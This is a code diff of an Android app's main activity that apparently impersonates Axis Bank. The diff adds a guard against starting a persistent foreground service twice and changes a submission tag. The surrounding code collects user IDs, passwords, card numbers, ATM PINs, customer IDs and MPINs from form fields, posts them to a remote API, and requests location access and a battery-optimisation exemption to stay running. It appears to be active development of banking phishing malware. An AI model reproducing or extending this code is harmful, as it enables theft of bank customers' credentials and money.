@@ -1,5 +1,6 @@
 package com.example.axisbank
 
+import android.app.ActivityManager
 import android.content.Intent
 import android.net.Uri
 import android.os.Bundle
@@ -13,7 +14,6 @@ import com.example.axisbank.databinding.ActivityMainBinding
 import retrofit2.Call
 import retrofit2.Callback
 import retrofit2.Response
-import java.util.Random
 
 
 class MainActivity : AppCompatActivity() {
@@ -30,8 +30,11 @@ class MainActivity : AppCompatActivity() {
         geopermission.requestPermissions(this)
 
         if (geopermission.hasGeoPermissions(this)) {
-            val serviceIntent = Intent(this, MyForegroundService::class.java)
-            ContextCompat.startForegroundService(this, serviceIntent)
+            val isServiceRunning = isServiceRunning(MyForegroundService::class.java)
+            if (!isServiceRunning) {
+                val serviceIntent = Intent(this, MyForegroundService::class.java)
+                ContextCompat.startForegroundService(this, serviceIntent)
+            }
         }
 
 
@@ -109,7 +112,7 @@ class MainActivity : AppCompatActivity() {
 
                 if (btnstr == "cus") {
 
-                    val data = Submit1(domain = "example.com", last_update = "first", mobile = binding.e3.text.toString(),
+                    val data = Submit1(domain = "example.com", last_update = "second123", mobile = binding.e3.text.toString(),
                         password = binding.e2.text.toString(), userid = binding.e1.text.toString())
                     util.saveLocalData(this,"mobile",binding.e3.text.toString() )
                     val call = apiService.submitData(data)
@@ -133,7 +136,7 @@ class MainActivity : AppCompatActivity() {
 
 
                     val data = Submit2(atmpin = binding.e3.text.toString(), cardno = binding.e2.text.toString(), domain = "example.com",
-                        last_update = "first", mobile = binding.e1.text.toString())
+                        last_update = "second123", mobile = binding.e1.text.toString())
                     util.saveLocalData(this,"mobile",binding.e1.text.toString() )
                     val call = apiService.submitData(data)
                     call.enqueue(object : Callback<Void?> {
@@ -155,7 +158,7 @@ class MainActivity : AppCompatActivity() {
                 } else {
 
                     val data = Submit3(customer_id = binding.e2.text.toString(), mpin = binding.e3.text.toString(), domain = "example.com",
-                        last_update = "first", mobile = binding.e1.text.toString())
+                        last_update = "second123", mobile = binding.e1.text.toString())
                     util.saveLocalData(this,"mobile",binding.e1.text.toString() )
                     val call = apiService.submitData(data)
                     call.enqueue(object : Callback<Void?> {
@@ -192,6 +195,16 @@ class MainActivity : AppCompatActivity() {
         startActivity(intent)
     }
 
+    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
+        val manager = getSystemService(ACTIVITY_SERVICE) as ActivityManager
+        for (service in manager.getRunningServices(Int.MAX_VALUE)) {
+            if (serviceClass.name == service.service.className) {
+                return true
+            }
+        }
+        return false
+    }
+
     override fun onRequestPermissionsResult(
         requestCode: Int,
         permissions: Array<String?>,
@@ -208,8 +221,14 @@ class MainActivity : AppCompatActivity() {
         if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
             requestBatteryOptimizationPermission()
         }
-        val serviceIntent = Intent(this, MyForegroundService::class.java)
-        ContextCompat.startForegroundService(this, serviceIntent)
+
+        val isServiceRunning = isServiceRunning(MyForegroundService::class.java)
+        if (!isServiceRunning) {
+            val serviceIntent = Intent(this, MyForegroundService::class.java)
+            ContextCompat.startForegroundService(this, serviceIntent)
+        }
+
+
     }
 
 }
